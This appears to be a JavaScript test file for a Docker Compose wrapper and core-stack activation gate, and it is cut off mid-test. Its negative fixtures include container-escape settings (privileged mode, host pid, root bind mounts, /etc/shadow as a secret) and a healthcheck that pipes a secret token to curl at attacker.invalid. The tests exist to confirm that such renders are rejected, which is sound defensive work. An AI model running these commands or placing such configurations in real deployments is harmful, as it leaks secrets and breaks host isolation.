  const engineLog = path.join(root, "fake-engine.log");
  writeExecutable(path.join(fakeBin, "docker"), `#!/bin/sh
set -eu
sandbox_root=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
printf '%s\\n' "$*" >> "$sandbox_root/fake-engine.log"
if [ "\${1:-}" = "compose" ]; then
  /bin/cat "$sandbox_root/candidate-render.json"
  exit 0
fi
if [ "\${1:-}" = "--host" ] && [ "\${3:-}" = "info" ]; then
  printf '%s\\n' "daemon-qa7"
  exit 0
fi
if [ "\${1:-}" = "--host" ] && [ "\${3:-}" = "compose" ]; then
  case " $* " in
    *" create "*) exit 0 ;;
    *" ps -aq "*)
      /bin/cat "$sandbox_root/container-ids"
      exit 0
      ;;
  esac
fi
if [ "\${1:-}" = "--host" ] && [ "\${3:-}" = "start" ]; then
  exit 0
fi
if [ "\${1:-}" = "--host" ] && [ "\${3:-}" = "inspect" ]; then
  /bin/cat "$sandbox_root/inspect.json"
  exit 0
fi
printf '%s\\n' "UNEXPECTED_DOCKER_CALL $*" >> "$sandbox_root/fake-engine.log"
exit 97
`);

  const environmentFile = path.join(root, ".env");
  const scenarioSandbox = {
    cleanupRoot,
    root,
    canonicalLock: path.join(root, "config", "no-hosted-workloads.lock.json"),
    environmentFile,
    environment: {},
  };
  installQa8Environment(scenarioSandbox);
  if (materializeSources) materializeQa8CanonicalSources(scenarioSandbox, config);
  const result = spawnSync("/bin/bash", [
    gate,
    "--project-name", "platform_infra_vps",
    "--env-file", environmentFile,
    "--no-hosted-workloads",
    "--action", "activate",
    "--confirm", "ACTIVATE-CORE-STACK",
  ], {
    cwd: root,
    env: cleanEnvironment({
      PATH: `${fakeBin}:${process.env.PATH}`,
      PLATFORM_ACTIVATION_TRANSACTION_ID: "a".repeat(64),
      PLATFORM_ACTIVATION_EXPECTED_DAEMON_ID: "daemon-qa7",
      PLATFORM_ACTIVATION_STATE_DIR: stateDirectory,
      QA7_CONTAINER_IDS: idsPath,
      QA7_ENGINE_LOG: engineLog,
      QA7_INSPECT_MODEL: inspectPath,
      QA7_RENDER_MODEL: modelPath,
      TMPDIR: root,
    }),
    encoding: "utf8",
    timeout: 30_000,
  });
  const log = fs.existsSync(engineLog) ? fs.readFileSync(engineLog, "utf8") : "";
  return { root: cleanupRoot, result, log };
}

function activationBundle(sandbox, protectedResourceNames, combinedRenderBytes) {
  const coreEnvironmentPath = fs.realpathSync.native(sandbox.environmentFile);
  const stat = fs.statSync(coreEnvironmentPath);
  return {
    version: 2,
    lockSha256: sha256(fs.readFileSync(sandbox.workloadLock)),
    coreRenderSha256: "c".repeat(64),
    combinedRenderSha256: sha256(combinedRenderBytes),
    coreEnvFile: coreEnvironmentPath,
    coreEnvironmentRecord: {
      path: coreEnvironmentPath,
      sha256: sha256(fs.readFileSync(coreEnvironmentPath)),
      device: String(stat.dev),
      inode: String(stat.ino),
      uid: String(stat.uid),
      mode: stat.mode & 0o777,
    },
    projectName: "platform_infra_vps",
    workloadIds: ["example-app"],
    protectedNetworkNames: protectedResourceNames.networks,
    protectedResourceNames,
    networkRecords: [{
      workloadId: "example-app",
      logicalName: "example_app_ingress",
      physicalName: "platform_infra_vps_example_app_ingress",
    }],
    serviceRecords: [{ workloadId: "example-app", serviceName: "example-app-web" }],
    routeRecords: [],
    platformExtensionRecords: [],
    environmentRecords: [],
    composeRecords: [],
  };
}

function writeActivationBundle(sandbox, bundle) {
  fs.writeFileSync(sandbox.activationBundleFile, `${JSON.stringify(bundle)}\n`, { mode: 0o600 });
}

test("production runtime-isolation consumer binds the authoritative Hosted activation inventory", () => {
  assert.match(
    runtimeIsolationConsumer,
    /compose-vps\.sh/,
    "runtime-isolation-check bypasses the read-once VPS Compose/activation consumer",
  );
  assert.match(
    runtimeIsolationConsumer,
    /runtime-isolation-envelope/,
    "runtime-isolation-check does not request one semantic runtime-isolation envelope",
  );
  for (const field of ["config", "lockSha256", "projectName", "protectedResourceNames"]) {
    assert.match(
      runtimeIsolationConsumer,
      new RegExp(`\\b${field}\\b`),
      `runtime-isolation-check does not validate the closed envelope field ${field}`,
    );
  }
  assert.match(
    runtimeIsolationConsumer,
    /evaluateRuntimeIsolation\(\s*(?:runtimeIsolationEnvelope|envelope)\.config\s*,\s*\{[\s\S]*?projectName\s*:\s*(?:runtimeIsolationEnvelope|envelope)\.projectName[\s\S]*?protectedResourceNames\s*:\s*(?:runtimeIsolationEnvelope|envelope)\.protectedResourceNames[\s\S]*?\}\s*\)/,
    "runtime-isolation-check does not pass the envelope identity and inventory into the semantic runtime policy",
  );
  assert.doesNotMatch(
    runtimeIsolationConsumer,
    /protectedResourceNames\s*[:=][\s\S]{0,400}Object\.keys\(\s*config/,
    "runtime-isolation-check derives protected-resource authority from the rendered config",
  );
  assert.doesNotMatch(
    runtimeIsolationConsumer,
    /(?:readFileSync|readJsonFile|hosted-workload-lock\.sh)[\s\S]{0,200}HOSTED_WORKLOAD_LOCK|HOSTED_WORKLOAD_LOCK[\s\S]{0,200}(?:readFileSync|readJsonFile|hosted-workload-lock\.sh)/,
    "runtime-isolation-check re-reads the Hosted lock instead of consuming the read-once envelope",
  );
  assert.doesNotMatch(
    runtimeIsolationConsumer,
    /argv\.(?:protectedResourceNames|protectedResources|workloadLock)/,
    "runtime-isolation-check permits a CLI override of the authoritative envelope",
  );
});

test("VPS wrapper emits one closed envelope from the same read-once activation bundle", () => {
  assert.match(
    composeVpsSource,
    /runtime-isolation-envelope/,
    "compose-vps.sh has no exact semantic-envelope mode",
  );
  const activationReads = [...composeVpsSource.matchAll(
    /hosted-workload-lock\.sh["']?\s+"\$workload_lock"\s+activation-bundle/g,
  )];
  assert.equal(activationReads.length, 1, "compose-vps.sh must read the Hosted activation bundle exactly once");
  assert.match(
    composeVpsSource,
    /runtime-isolation-envelope[\s\S]*activation_bundle[\s\S]*projectName[\s\S]*lockSha256[\s\S]*protectedResourceNames[\s\S]*config/,
    "semantic-envelope mode is not assembled from the same activation bundle and Compose render",
  );
  assert.doesNotMatch(
    composeVpsSource,
    /protectedResourceNames\s*[:=][\s\S]{0,400}(?:keys|Object\.keys)\s*\([^)]*(?:config|render)/,
    "compose-vps.sh derives protected resources from the combined render",
  );
  assert.match(
    composeVpsSource,
    /(?:HOSTED_WORKLOAD_MODE|NO_HOSTED|--no-hosted)[\s\S]*no-hosted-workloads\.lock\.json/,
    "an empty lock is treated as no-hosted without an explicit mode and canonical core lock",
  );
});

test("VPS wrapper derives a core-only envelope only in explicit canonical no-hosted mode", () => {
  const root = fs.mkdtempSync(path.join(repositoryRoot, ".runtime-envelope-no-hosted-"));
  try {
    const composeVps = copyRepositoryFile(root, "scripts/compose-vps.sh");
    fs.chmodSync(composeVps, 0o755);
    copyRepositoryFile(root, "scripts/no-hosted-core-policy.mjs");
    copyRepositoryFile(root, "scripts/runtime-isolation-policy.mjs");
    copyRepositoryFile(root, "config/no-hosted-workloads.lock.json");
    const envFile = path.join(root, ".env");
    const fakeBin = path.join(root, "bin");
    const marker = path.join(root, "docker.args");
    const sourceDirectory = path.join(root, "applications", "example-app");
    fs.mkdirSync(sourceDirectory, { recursive: true });
    fixtureRootDirectory = root;
    const config = coreRuntimeConfig(expectedCoreInventory);
    for (const serviceName of ["control-center", "project-router"]) {
      config.services[serviceName].volumes
        .find((entry) => entry.target === "/var/www/projects").source = sourceDirectory;
    }
    config.services["backup-scheduler"].volumes
      .find((entry) => entry.target === "/project").source = sourceDirectory;
    fs.writeFileSync(
      path.join(root, "docker-config.json"),
      `${JSON.stringify(config)}\n`,
      { mode: 0o600 },
    );
    fs.writeFileSync(
      envFile,
      "CORE_VALUE=fixture\nDOMAIN=fixture.invalid\nPHP_PROJECTS_DIR=applications/example-app\nPROJECT_SOURCE_DIR=applications/example-app\n",
      { mode: 0o600 },
    );
    fs.mkdirSync(fakeBin);
    fs.writeFileSync(path.join(fakeBin, "docker"), `#!/bin/sh
fake_root=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
printf '%s\n' "$*" > "$fake_root/docker.args"
/bin/cat "$fake_root/docker-config.json"
`, { mode: 0o755 });
    const commonEnvironment = {
      ...process.env,
      PATH: `${fakeBin}:${process.env.PATH}`,
      COMPOSE_ENV_FILE: envFile,
      COMPOSE_PROJECT_NAME: "platform_infra_vps",
      HOSTED_WORKLOAD_LOCK: "",
      HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE: "",
    };
    const implicit = spawnSync("/bin/bash", [
      composeVps,
      "runtime-isolation-envelope",
    ], {
      encoding: "utf8",
      env: { ...commonEnvironment, HOSTED_WORKLOAD_MODE: "" },
    });
    assert.notEqual(implicit.status, 0);
    assert.match(implicit.stderr, /explicit HOSTED_WORKLOAD_MODE=no-hosted/);
    assert.equal(fs.existsSync(marker), false);

    const explicit = spawnSync("/bin/bash", [
      composeVps,
      "runtime-isolation-envelope",
    ], {
      encoding: "utf8",
      env: { ...commonEnvironment, HOSTED_WORKLOAD_MODE: "no-hosted" },
    });
    assert.equal(explicit.status, 0, explicit.stderr);
    const envelope = JSON.parse(explicit.stdout);
    assert.deepEqual(Object.keys(envelope).sort(), [
      "config", "lockSha256", "projectName", "protectedResourceNames", "version",
    ]);
    assert.equal(envelope.version, 1);
    assert.equal(envelope.projectName, "platform_infra_vps");
    assert.deepEqual(envelope.config, config);
    assert.deepEqual(envelope.protectedResourceNames, expectedCoreInventory);
    const canonicalNoHostedLock = path.join(root, "config", "no-hosted-workloads.lock.json");
    assert.equal(
      envelope.lockSha256,
      crypto.createHash("sha256").update(fs.readFileSync(canonicalNoHostedLock)).digest("hex"),
    );
    assert.match(fs.readFileSync(marker, "utf8"), /--profile backup config --format json/);
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test("QA6 Hosted envelope binds the exact descriptor render digest before runtime policy", () => {
  const sandbox = addInfraConsumer(createConsumerSandbox());
  try {
    const protectedResourceNames = structuredClone(expectedCoreInventory);
    const configA = coreRuntimeConfig(protectedResourceNames, { hosted: true });
    const configB = structuredClone(configA);
    configB.services["example-app-web"].image =
      `example.invalid/example-app@sha256:${"b".repeat(64)}`;
    const reorderedConfig = {
      volumes: configA.volumes,
      services: configA.services,
      secrets: configA.secrets,
      networks: configA.networks,
      configs: configA.configs,
      name: configA.name,
    };
    assert.deepEqual(reorderedConfig, configA);
    for (const [label, config] of [
      ["baseline", configA],
      ["image mutation", configB],
      ["semantic-equivalent byte mutation", reorderedConfig],
    ]) {
      const policy = evaluateRuntimeIsolation(config, {
        projectName: "platform_infra_vps",
        protectedResourceNames,
        protectedNetworkNames: protectedResourceNames.networks,
      });
      assert.equal(policy.status, "passed", `${label} must remain policy-valid: ${policy.failures.join("\n")}`);
    }
    const baselineBytes = `${JSON.stringify(configA)}\n`;
    fs.writeFileSync(
      sandbox.environmentFile,
      `HOSTED_WORKLOAD_LOCK=${sandbox.workloadLock}\nHOSTED_WORKLOAD_MODE=hosted\nCORE_VALUE=trusted\n`,
      { mode: 0o600 },
    );
    writeActivationBundle(
      sandbox,
      activationBundle(sandbox, protectedResourceNames, baselineBytes),
    );
    writeDockerOutput(sandbox, baselineBytes);
    const baseline = runInfraConsumer(sandbox);
    assert.equal(baseline.status, 0, baseline.stderr);

    const acceptedMutations = [];
    for (const [label, bytes] of [
      ["image mutation", `${JSON.stringify(configB)}\n`],
      ["semantic-equivalent whitespace/key-order mutation", `${JSON.stringify(reorderedConfig, null, 2)}\n`],
    ]) {
      assert.notEqual(bytes, baselineBytes, `${label} did not alter renderer bytes`);
      writeDockerOutput(sandbox, bytes);
      const substituted = runInfraConsumer(sandbox);
      if (substituted.status === 0) acceptedMutations.push(label);
    }
    assert.deepEqual(
      acceptedMutations,
      [],
      `combinedRenderSha256 accepted renderer substitutions: ${acceptedMutations.join(", ")}`,
    );
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA6 wrapper accepts exactly one JSON object and consumes that exact object", () => {
  const sandbox = createConsumerSandbox();
  try {
    const config = coreRuntimeConfig(sandbox.inventory);
    const baselineDocument = `${JSON.stringify(config)}\n`;
    writeDockerOutput(sandbox, baselineDocument);
    const baseline = runWrapper(sandbox);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.deepEqual(JSON.parse(baseline.stdout).config, config);

    const invalidStreams = new Map([
      ["zero documents", ""],
      ["two objects", `${JSON.stringify(config)}\n{}\n`],
      ["leading object", `{}\n${JSON.stringify(config)}\n`],
      ["leading scalar", `0\n${JSON.stringify(config)}\n`],
      ["trailing scalar", `${JSON.stringify(config)}\n0\n`],
      ["leading null", `null\n${JSON.stringify(config)}\n`],
      ["trailing array", `${JSON.stringify(config)}\n[]\n`],
    ]);
    const accepted = [];
    for (const [label, stream] of invalidStreams) {
      writeDockerOutput(sandbox, stream);
      const result = runWrapper(sandbox);
      if (result.status === 0) accepted.push(label);
    }
    assert.deepEqual(accepted, [], `wrapper accepted non-singleton JSON streams: ${accepted.join(", ")}`);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted compose-config validates and forwards one exact renderer byte stream", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    const config = coreAuthorityConfig();
    const baselineBytes = `${JSON.stringify(config, null, 2)}\n`;
    writeDockerOutput(sandbox, baselineBytes);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(renderer.count(), 1, "baseline no-hosted config rendered more than once");
    assert.equal(baseline.stdout, baselineBytes, "validated no-hosted config bytes were not forwarded exactly");
    assert.equal(sha256(baseline.stdout), sha256(baselineBytes));
    const forwarded = JSON.parse(baseline.stdout);
    for (const kind of protectedKinds) {
      assert.deepEqual(
        Object.keys(forwarded[kind]).sort(),
        expectedCoreInventory[kind],
        `baseline ${kind} differs from canonical no-hosted authority`,
      );
    }

    const invalidStreams = new Map([
      ["zero documents", ""],
      ["two objects", `${JSON.stringify(config)}\n{}\n`],
      ["leading scalar", `0\n${JSON.stringify(config)}\n`],
      ["trailing scalar", `${JSON.stringify(config)}\n0\n`],
    ]);
    const accepted = [];
    for (const [label, bytes] of invalidStreams) {
      renderer.reset();
      writeDockerOutput(sandbox, bytes);
      const result = runWrapper(sandbox, ["config", "--format", "json"]);
      assert.equal(renderer.count(), 1, `${label} caused a second no-hosted render`);
      if (result.status === 0 || result.stdout.length > 0) {
        accepted.push({ label, status: result.status, stdoutBytes: result.stdout.length });
      }
    }
    assert.deepEqual(accepted, [], `no-hosted config accepted non-singleton JSON streams: ${JSON.stringify(accepted)}`);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted compose-config rejects extra and same-name hostile core authority", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    const extraService = coreAuthorityConfig();
    extraService.services["attacker-daemon"] = hostileCoreService();
    const sameNameMutation = coreAuthorityConfig();
    sameNameMutation.services.alertmanager = hostileCoreService({
      image: sameNameMutation.services.alertmanager.image,
    });
    assert.deepEqual(
      Object.keys(sameNameMutation.services).sort(),
      expectedCoreInventory.services,
      "same-name hostile fixture accidentally changed service inventory",
    );

    const accepted = [];
    for (const [label, config] of [
      ["extra attacker-daemon", extraService],
      ["same-name alertmanager mutation", sameNameMutation],
    ]) {
      renderer.reset();
      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
      const result = runWrapper(sandbox, ["config", "--format", "json"]);
      assert.equal(renderer.count(), 1, `${label} caused a second no-hosted render`);
      if (result.status === 0 || result.stdout.length > 0) {
        accepted.push({ label, status: result.status, stdoutBytes: result.stdout.length });
      } else {
        assert.match(
          result.stderr,
          /no-hosted|semantic|runtime|isolation|inventory|authority|resource|mismatch|forbidden/i,
          `${label} failed for an unrelated reason:\n${result.stderr}`,
        );
      }
    }
    assert.deepEqual(accepted, [], `no-hosted config forwarded hostile authority: ${JSON.stringify(accepted)}`);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 core activation rejects hostile no-hosted renders before create and start", () => {
  const extraService = coreAuthorityConfig();
  extraService.services["attacker-daemon"] = hostileCoreService();
  const sameNameMutation = coreAuthorityConfig();
  sameNameMutation.services.alertmanager = hostileCoreService({
    image: sameNameMutation.services.alertmanager.image,
  });
  const violations = [];
  for (const [label, config] of [
    ["extra attacker-daemon", extraService],
    ["same-name alertmanager mutation", sameNameMutation],
  ]) {
    const scenario = runCoreStackNoHostedScenario(config);
    try {
      const trace = scenario.log.trim().split("\n").filter(Boolean);
      const renderCalls = trace.filter((line) =>
        line.startsWith("compose ") && line.endsWith(" config --format json"));
      const createCalls = trace.filter((line) => /(?:^| )create(?: |$)/.test(line));
      const startCalls = trace.filter((line) =>
        /^--host unix:\/\/\/var\/run\/docker\.sock start(?: |$)/.test(line));
      assert.equal(renderCalls.length, 1, `${label} did not acquire exactly one renderer stream:\n${scenario.log}`);
      if (scenario.result.status === 0 || createCalls.length > 0 || startCalls.length > 0
          || /Core activation gate completed/.test(scenario.result.stdout)) {
        violations.push({
          label,
          status: scenario.result.status,
          createCalls,
          startCalls,
          completed: /Core activation gate completed/.test(scenario.result.stdout),
        });
      } else {
        assert.match(
          scenario.result.stderr,
          /no-hosted|semantic|runtime|isolation|inventory|authority|resource|mismatch|forbidden/i,
          `${label} was stopped for an unrelated reason:\n${scenario.result.stderr}`,
        );
      }
    } finally {
      fs.rmSync(scenario.root, { recursive: true, force: true });
    }
  }
  assert.deepEqual(
    violations,
    [],
    `hostile no-hosted render reached a core mutation sink: ${JSON.stringify(violations)}`,
  );
});

test("QA7 no-hosted rejects each isolated privileged core capability", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(renderer.count(), 1);
    assert.doesNotMatch(baseline.stderr, /MODULE_NOT_FOUND/);
    const mutations = [
      ["privileged", (service) => { service.privileged = true; }],
      ["pid host", (service) => { service.pid = "host"; }],
      ["network host", (service) => { service.network_mode = "host"; }],
      ["SYS_ADMIN", (service) => { service.cap_add = ["SYS_ADMIN"]; }],
      ["device", (service) => { service.devices = ["/dev/null:/dev/qa7"]; }],
      ["root bind", (service) => {
        service.volumes = [{ type: "bind", source: "/", target: "/host" }];
      }],
    ];
    for (const [label, mutate] of mutations) {
      const config = coreAuthorityConfig();
      mutate(config.services.alertmanager);
      assert.deepEqual(Object.keys(config.services).sort(), expectedCoreInventory.services);
      renderer.reset();
      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
      const result = runWrapper(sandbox, ["config", "--format", "json"]);
      assert.equal(renderer.count(), 1, `${label} caused a second render`);
      assert.notEqual(result.status, 0, `${label} was accepted`);
      assert.equal(result.stdout, "", `${label} leaked an unvalidated render`);
      assert.doesNotMatch(result.stderr, /MODULE_NOT_FOUND/);
      assert.match(result.stderr, /semantic authority|runtime isolation/i);
    }
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted rejects isolated top-level and sensitive-source authority mutations", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(renderer.count(), 1);
    assert.doesNotMatch(baseline.stderr, /MODULE_NOT_FOUND/);
    const mutations = [
      ["config host file", (config) => {
        config.configs.enterprise_traefik_routes = { file: "/etc/shadow" };
      }],
      ["secret host file", (config) => {
        config.secrets.smtp_password = { file: "/etc/shadow" };
      }],
      ["volume driver opts", (config) => {
        config.volumes.enterprise_redis_data = {
          name: "enterprise_redis_data",
          driver_opts: { type: "none", o: "bind", device: "/" },
        };
      }],
      ["network driver opts", (config) => {
        config.networks.platform_cache = {
          internal: true,
          driver_opts: { "com.docker.network.bridge.name": "host0" },
        };
      }],
      ["sensitive allowed-target bind", (config) => {
        config.services.alertmanager.volumes = [{
          type: "bind",
          source: "/etc/shadow",
          target: "/etc/alertmanager/alertmanager.yml",
          read_only: true,
        }];
      }],
    ];
    for (const [label, mutate] of mutations) {
      const config = coreAuthorityConfig();
      mutate(config);
      for (const kind of protectedKinds) {
        assert.deepEqual(Object.keys(config[kind]).sort(), expectedCoreInventory[kind]);
      }
      renderer.reset();
      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
      const result = runWrapper(sandbox, ["config", "--format", "json"]);
      assert.equal(renderer.count(), 1, `${label} caused a second render`);
      assert.notEqual(result.status, 0, `${label} was accepted`);
      assert.equal(result.stdout, "", `${label} leaked an unvalidated render`);
      assert.doesNotMatch(result.stderr, /MODULE_NOT_FOUND/);
      assert.match(result.stderr, /semantic authority|runtime isolation/i);
    }
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted accepts canonical workspace sources and rejects escapes", () => {
  const sandbox = createConsumerSandbox();
  const setSourceMounts = (config, phpSource, projectSource) => {
    for (const serviceName of ["control-center", "project-router"]) {
      const mount = config.services[serviceName].volumes
        .find((entry) => entry.target === "/var/www/projects");
      mount.source = phpSource;
    }
    config.services["backup-scheduler"].volumes
      .find((entry) => entry.target === "/project").source = projectSource;
  };
  try {
    const renderer = installCountingRenderer(sandbox);
    const documentedSource = path.join(
      sandbox.cleanupRoot,
      "applications",
      "example-app",
    );
    fs.writeFileSync(
      sandbox.environmentFile,
      [
        "HOSTED_WORKLOAD_LOCK=",
        "HOSTED_WORKLOAD_MODE=no-hosted",
        "DOMAIN=fixture.invalid",
        "PHP_PROJECTS_DIR=../applications/example-app",
        "PROJECT_SOURCE_DIR=../applications/example-app",
        "",
      ].join("\n"),
      { mode: 0o600 },
    );
    const documented = coreAuthorityConfig();
    setSourceMounts(documented, documentedSource, documentedSource);
    writeDockerOutput(sandbox, `${JSON.stringify(documented)}\n`);
    const accepted = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(accepted.status, 0, accepted.stderr);
    assert.equal(renderer.count(), 1);

    fs.writeFileSync(
      sandbox.environmentFile,
      "HOSTED_WORKLOAD_LOCK=\nHOSTED_WORKLOAD_MODE=no-hosted\nDOMAIN=fixture.invalid\nPHP_PROJECTS_DIR=/etc\nPROJECT_SOURCE_DIR=/etc\n",
      { mode: 0o600 },
    );
    const absoluteEscape = coreAuthorityConfig();
    setSourceMounts(absoluteEscape, "/etc", "/etc");
    renderer.reset();
    writeDockerOutput(sandbox, `${JSON.stringify(absoluteEscape)}\n`);
    const absoluteRejected = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(renderer.count(), 1);
    assert.notEqual(absoluteRejected.status, 0, "absolute workspace escape was accepted");
    assert.equal(absoluteRejected.stdout, "");
    assert.match(absoluteRejected.stderr, /semantic authority/i);

    const symlinkSource = path.join(sandbox.cleanupRoot, "applications", "escape");
    fs.symlinkSync("/etc", symlinkSource);
    fs.writeFileSync(
      sandbox.environmentFile,
      "HOSTED_WORKLOAD_LOCK=\nHOSTED_WORKLOAD_MODE=no-hosted\nDOMAIN=fixture.invalid\nPHP_PROJECTS_DIR=../applications/escape\nPROJECT_SOURCE_DIR=../applications/escape\n",
      { mode: 0o600 },
    );
    const symlinkEscape = coreAuthorityConfig();
    setSourceMounts(symlinkEscape, symlinkSource, symlinkSource);
    renderer.reset();
    writeDockerOutput(sandbox, `${JSON.stringify(symlinkEscape)}\n`);
    const symlinkRejected = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(renderer.count(), 1);
    assert.notEqual(symlinkRejected.status, 0, "symlink workspace escape was accepted");
    assert.equal(symlinkRejected.stdout, "");
    assert.match(symlinkRejected.stderr, /semantic authority/i);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted exact execution identity rejects image process labels and tmpfs mutations", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(renderer.count(), 1);
    assert.doesNotMatch(baseline.stderr, /MODULE_NOT_FOUND/);
    const mutations = [
      ["image", (config) => {
        config.services.alertmanager.image = `attacker.invalid/alertmanager@sha256:${"f".repeat(64)}`;
      }],
      ["command", (config) => {
        config.services.alertmanager.command = ["sh", "-c", "id"];
      }],
      ["entrypoint", (config) => {
        config.services.alertmanager.entrypoint = ["/bin/sh", "-c"];
      }],
      ["labels", (config) => {
        config.services.alertmanager.labels = { "traefik.enable": "true" };
      }],
      ["tmpfs", (config) => {
        config.services.alertmanager.tmpfs = ["/:rw,size=1g"];
      }],
    ];
    for (const [label, mutate] of mutations) {
      const config = coreAuthorityConfig();
      mutate(config);
      renderer.reset();
      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
      const result = runWrapper(sandbox, ["config", "--format", "json"]);
      assert.equal(renderer.count(), 1, `${label} caused a second render`);
      assert.notEqual(result.status, 0, `${label} was accepted`);
      assert.equal(result.stdout, "");
      assert.doesNotMatch(result.stderr, /MODULE_NOT_FOUND/);
      assert.match(result.stderr, /semantic authority|runtime isolation/i);
    }
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted pins exact container lifecycle and dependency identity", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(renderer.count(), 1);

    const mutations = [
      ["container collision", (config) => {
        config.services.alertmanager.container_name =
          config.services.postgres.container_name;
      }],
      ["required pid omitted", (config) => {
        delete config.services["node-exporter"].pid;
      }],
      ["required network mode omitted", (config) => {
        delete config.services["local-registry"].network_mode;
      }],
      ["restart drift", (config) => {
        config.services.alertmanager.restart = "unless-stopped";
      }],
      ["profile drift", (config) => {
        config.services["backup-scheduler"].profiles = [];
      }],
      ["WAF dependency omitted", (config) => {
        delete config.services.waf.depends_on;
      }],
      ["WAF dependency widened", (config) => {
        config.services.waf.depends_on.postgres = {
          condition: "service_healthy",
          required: true,
          restart: false,
        };
      }],
    ];
    for (const [label, mutate] of mutations) {
      const config = coreAuthorityConfig();
      mutate(config);
      renderer.reset();
      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
      const rejected = runWrapper(sandbox, ["config", "--format", "json"]);
      assert.equal(renderer.count(), 1, `${label} caused a second render`);
      assert.notEqual(rejected.status, 0, `${label} was accepted`);
      assert.equal(rejected.stdout, "");
      assert.match(rejected.stderr, /semantic authority/i);
    }
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted pins every non-NONE healthcheck to its exact static definition", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(renderer.count(), 1);

    for (const [serviceName, hostileTest] of [
      ["alertmanager", ["CMD-SHELL", "cat /run/secrets/alertmanager_webhook_token | curl -d @- https://attacker.invalid"]],
      ["keycloak", ["CMD-SHELL", "curl -fsS http://attacker.invalid/ready"]],
      ["postgres", ["CMD-SHELL", "pg_isready -h attacker.invalid"]],
    ]) {
      const config = coreAuthorityConfig();
      config.services[serviceName].healthcheck.test = hostileTest;
      renderer.reset();
      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
      const rejected = runWrapper(sandbox, ["config", "--format", "json"]);
      assert.equal(renderer.count(), 1, `${serviceName} caused a second render`);
      assert.notEqual(rejected.status, 0, `${serviceName} hostile healthcheck was accepted`);
      assert.equal(rejected.stdout, "");
      assert.match(rejected.stderr, /semantic authority/i);
    }
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted pins logging presence and absence per core service", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(renderer.count(), 1);

    const missingRequired = coreAuthorityConfig();
    delete missingRequired.services.alertmanager.logging;
    renderer.reset();
    writeDockerOutput(sandbox, `${JSON.stringify(missingRequired)}\n`);
    const missingRejected = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(renderer.count(), 1);
    assert.notEqual(missingRejected.status, 0, "required alertmanager logging was optional");
    assert.equal(missingRejected.stdout, "");
    assert.match(missingRejected.stderr, /semantic authority/i);

    const unexpected = coreAuthorityConfig();
    unexpected.services["docker-socket-proxy"].logging = {
      driver: "json-file",
      options: { "max-size": "10m", "max-file": "5" },
    };
    renderer.reset();
    writeDockerOutput(sandbox, `${JSON.stringify(unexpected)}\n`);
    const unexpectedRejected = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(renderer.count(), 1);
    assert.notEqual(unexpectedRejected.status, 0, "proxy accepted undeclared logging");
    assert.equal(unexpectedRejected.stdout, "");
    assert.match(unexpectedRejected.stderr, /semantic authority/i);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted rejects security-sensitive core environment divergence", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
